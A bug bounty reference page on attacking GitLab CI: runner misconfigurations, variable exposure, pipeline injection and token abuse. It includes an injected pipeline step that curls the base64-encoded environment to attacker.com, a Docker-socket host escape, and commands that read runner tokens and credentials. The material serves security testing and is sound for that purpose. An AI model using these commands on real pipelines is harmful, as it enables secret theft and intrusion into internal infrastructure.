> Source: https://bugbounty.info/Attack-Surface/CI-CD/GitLab-CI

# GitLab CI

GitLab CI is common in enterprise and self-hosted environments. The attack surface overlaps with GitHub Actions in some ways (yaml injection, secret exposure) but GitLab's runner model and variable scoping create unique issues. Self-hosted GitLab instances with misconfigured runners are the most interesting targets.

## Runner Architecture

GitLab runners execute pipeline jobs. They come in three types relevant to bug bounty:

- **Shared runners** (GitLab.com managed): sandboxed, limited blast radius
- **Group runners**: available to all projects in a group, more interesting
- **Project runners**: specific to one project, highest trust

Self-hosted runners often have:

- Direct network access to internal services
- Mounted Docker sockets
- Broad IAM/service account permissions
- Access to secrets management systems

If you can execute a pipeline job on a self-hosted runner, you're likely on an internal network.

## Variable Exposure

GitLab variables are scoped to project, group, or instance. They're available in pipeline jobs as environment variables. The misconfigs:

1. **Protected variable flag not set** - variable available in unprotected branch pipelines
2. **Masked variable flag not set** - variable prints in job logs
3. **File-type variable** - written to disk as a file, sometimes world-readable
4. **Variables in `.gitlab-ci.yml`** - devs hardcode values instead of using settings

```yaml
# In .gitlab-ci.yml, look for:
variables:
  DB_PASSWORD: "hardcoded_value"  # bad
  API_KEY: $SECRET_KEY            # only bad if SECRET_KEY isn't set in settings
 
# Jobs that print all env vars
debug:
  script:
    - env              # prints everything including masked vars... sometimes
    - printenv
    - cat /proc/1/environ
```

```bash
# If you can see the CI/CD variables page (maintainer access or misconfigured visibility)
# https://GITLAB_INSTANCE/group/project/-/settings/ci_cd
# Check for variables without the "Masked" flag
```

## Pipeline Manipulation

If you can push to a branch (contributor, fork, or via a vulnerability), you can modify `.gitlab-ci.yml` and inject commands into the pipeline execution.

```yaml
# Adding a malicious step to an existing stage
build:
  stage: build
  script:
    - make build
    - curl -s https://attacker.com/ -d "$(env | base64)"  # injected
```

For forks contributing to a project: GitLab's fork MR pipeline protection varies. Check if the project allows fork pipelines to run with parent project's CI variables - some configurations do.

## Runner Exploitation

### Docker Socket Exposure

Self-hosted runners often mount the Docker socket:

```bash
# Check if socket is mounted
ls -la /var/run/docker.sock
 
# If it is, escape to host
docker run -v /:/host -it alpine chroot /host sh
```

### Privilege Escalation via Runner Config

Runner tokens are stored in `/etc/gitlab-runner/config.toml` on the runner host. If you get shell on a runner and it has privileged mode:

```toml
[[runners]]
  [runners.docker]
    privileged = true  # container escape trivial
    volumes = ["/var/run/docker.sock:/var/run/docker.sock"]  # also bad
```

### Stealing the Runner Token

```bash
# From inside a pipeline job, the runner token is in the env
echo $CI_JOB_TOKEN
echo $CI_REGISTRY_PASSWORD
 
# Runner registration token (different from job token) - stored on host
cat /etc/gitlab-runner/config.toml | grep token
```

## GitLab API with CI_JOB_TOKEN

The `CI_JOB_TOKEN` is automatically available in all jobs. Its permissions are scoped but can be useful:

```bash
# Clone other repos the job has access to
git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.com/group/other-repo.git
 
# Access the GitLab API
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.com/api/v4/projects/$CI_PROJECT_ID/variables"
 
# Download artifacts from other projects (if allowlisted)
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.com/api/v4/projects/OTHER_PROJECT_ID/packages/..."
```

Check if `CI_JOB_TOKEN_SCOPE` is unrestricted - by default tokens can access all resources the user has access to in the group.

## YAML Injection

GitLab CI supports dynamic includes and `extends`, which can be abused if user-controlled input ends up in pipeline configuration:

```yaml
# Dynamic child pipeline generation - if user input affects the generated yaml
include:
  - project: 'group/repo'
    file: '$USER_CONTROLLED_PATH'  # path traversal possible
```

Also check `trigger:` jobs that spin up downstream pipelines with different contexts.

## Recon

```bash
# Find .gitlab-ci.yml files in public repos
# Look for self-hosted runner tags, hardcoded secrets, interesting stages
 
# Check if a GitLab instance exposes runner info
curl https://GITLAB_INSTANCE/api/v4/runners?scope=active
 
# Enumerate groups and projects
curl https://GITLAB_INSTANCE/api/v4/groups?per_page=100
```

## Public Reports

- GitLab CI variable masking bypass via base64 encoding exposes API keys in logs - [HackerOne #1540013](https://hackerone.com/reports/1540013)
- Self-hosted GitLab runner with Docker socket mounted allows container escape to host - [HackerOne Hacktivity search](https://hackerone.com/hacktivity?querystring=gitlab+runner+docker+escape)
- CI_JOB_TOKEN with unrestricted scope allows cloning any group repository - [HackerOne #1608529](https://hackerone.com/reports/1608529)
- Protected variable accessible in fork MR pipeline due to misconfigured project setting - [HackerOne #1472269](https://hackerone.com/reports/1472269)

## Related

- [Secret Leakage](../../Attack-Surface/CI-CD/Secret-Leakage) - variable masking failures, artifact exposure
- [CD Overview](../../)
- [GitHub Actions](../../Attack-Surface/CI-CD/GitHub-Actions) - comparison for OIDC and injection patterns
